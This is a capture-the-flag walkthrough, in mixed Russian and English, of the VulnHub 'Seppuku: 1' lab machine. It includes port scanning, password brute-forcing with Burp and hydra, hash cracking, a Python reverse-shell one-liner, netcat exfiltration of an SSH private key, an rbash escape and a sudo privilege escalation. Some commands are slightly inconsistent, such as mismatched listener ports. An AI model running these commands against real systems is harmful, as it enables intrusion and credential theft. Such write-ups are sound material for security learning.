https://www.vulnhub.com/entry/seppuku-1,484/

enumeration

nmap -sV -sC -p- 192.168.225.149 --min-rate=5000

    21/tcp open ftp vsftpd 3.0.3
    22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    80/tcp open http nginx 1.14.2
    139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
    7601/tcp open http Apache httpd 2.4.38 ((Debian))

gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.149

    error: the server returns a status code that matches the provided options for non existing urls.

80-port

1.  burp-intruder

        перехватываю запрос, перебираю пароли
        admin:Football

2.  gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.149 -U admin -P Football

        ....
        http://192.168.225.149/manager
        http://192.168.225.149/secret
        ....

    gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.149/manager -U admin -P Football

        ....
        http://192.168.225.149/manager/html
        ....

    <img src=img/seppuku_1_1.jpg width='500'>

    я так не смогла зайти с данными admin:Football, оставлю пока это

    gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.149/secret -U admin -P Football

        http://192.168.225.149/secret/shadow.bak
        ....
            r@bbit-hole:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
            ....

        http://192.168.225.149/secret/passwd.bak
           ....
            rabbit-hole:x:1001:1001:,,,:/home/rabbit-hole:/bin/bash
            ....

3.  john --wordlist=/root/Downloads/rockyou.txt hash

        a1b2c3

я попыталась зайти с этим на ssh, но не получилось  
эхэх тогда я и вспомнила про http://192.168.225.149/manager/html

4.  rabbit-hole:a1b2c3  
    <img src=img/seppuku_1_2.jpg width='500'>

        <on_own_machine> rlwrap nc -nlvp 1234
        <on_browser>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.225.128",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

22-port_www-data

1.  ls -al /var/www/html/secret
    ....
    password.lst
    ....

        ls -al /home
        seppuku
        samurai
        tanto

2.  hydra -L user.txt -P pass.txt ssh://192.168.225.149

        seppuku:eeyoree

3.  ls -al /var/www/html/keys

            private.bak
            private

    это id_rsa

        <on_own_machine> nc -lnvp 8000 > id_rsa
        <on_victim_machine> nc -w 3 192.168.225.128 9000 < /var/www/html/keys/private

        <on_own_machine> chmod 6000 id_rsa

    попробовав нескольких пользователей мы узнаем что это ключ от tanto
    <on_own_machine> ssh -i id_rsa tanto@192.168.225.128

22-port_seppuku

1.  sudo -l

        -rbash: sudo-l: command not found

    vi

        :set shell=/bin/sh
        :shell

    <img src=img/seppuku_1_3.jpg width='500'>

2.  cat /home/seppuku/.passwd

        12345685213456!@!@A

    это должно быть пароль от samurai

22-port_samurai

1.  sudo -l  
    (ALL) NOPASSWD: /../../../../../../home/tanto/cgi_bin/bin /tmp/\*

хммм так как у нас есть доступ к tanto ничто не мешает создать нам файл bin и загрузить в него то, что поможет нам повысить привиллегии

22-port_tanto

1.  cd /home/tanto  
    mkdir .cgi_bin  
    cd .cgi_bin  
    cat bin

        python3 -c "import os;os.system('/bin/bash');"

22-port_samurai

1.  sudo /home/tanto/.cgi_bin/bin /tmp/\*
    <img src=img/seppuku_1_4.jpg width='500'>
